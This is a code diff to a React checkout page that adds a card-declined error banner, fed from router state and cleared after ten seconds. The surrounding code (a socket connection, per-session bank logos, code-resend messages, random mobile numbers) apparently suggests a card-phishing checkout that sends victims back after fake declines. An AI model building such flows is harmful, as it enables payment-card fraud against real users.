@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { useSearchParams, useNavigate, Link } from 'react-router-dom';
+import { useSearchParams, useNavigate, Link, useLocation } from 'react-router-dom';
 import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -10,6 +10,7 @@ import { io, Socket } from 'socket.io-client';
 const Checkout = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
+  const location = useLocation();
   
   const planName = searchParams.get('plan') || 'Complete';
   const billing = searchParams.get('billing') || 'yearly';
@@ -74,6 +75,7 @@ const Checkout = () => {
   const [sessionBankLogo, setSessionBankLogo] = useState('');
   const [resendMessage, setResendMessage] = useState('');
   const [randomMobile, setRandomMobile] = useState('');
+  const [cardDeclinedError, setCardDeclinedError] = useState('');
 
   // Pricing data based on the main page
   const pricingData = {
@@ -98,6 +100,15 @@ const Checkout = () => {
   const currentPlan = pricingData[billing as keyof typeof pricingData][planName as keyof typeof pricingData.yearly];
   const displayPrice = billing === 'yearly' ? currentPlan.price : currentPlan.monthly;
   const billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
+
+  // Check for card declined error from location state
+  useEffect(() => {
+    if (location.state?.error) {
+      setCardDeclinedError(location.state.error);
+      // Clear the error after 10 seconds
+      setTimeout(() => setCardDeclinedError(''), 10000);
+    }
+  }, [location.state]);
 
   const validateField = (field: string, value: string) => {
     switch (field) {
@@ -933,6 +944,12 @@ const Checkout = () => {
                 {/* Card Details Form - Only shown when credit card is selected */}
                 {paymentMethod === 'credit' && (
                   <div className="space-y-6 mb-8">
+                    {/* Card Declined Error Message */}
+                    {cardDeclinedError && (
+                      <div className="bg-red-50 border border-red-300 rounded-lg p-4">
+                        <p className="text-red-700 text-sm font-medium">{cardDeclinedError}</p>
+                      </div>
+                    )}
                     <div className="grid md:grid-cols-2 gap-6">
                       <div>
                         <label className="block text-sm font-medium mb-2">
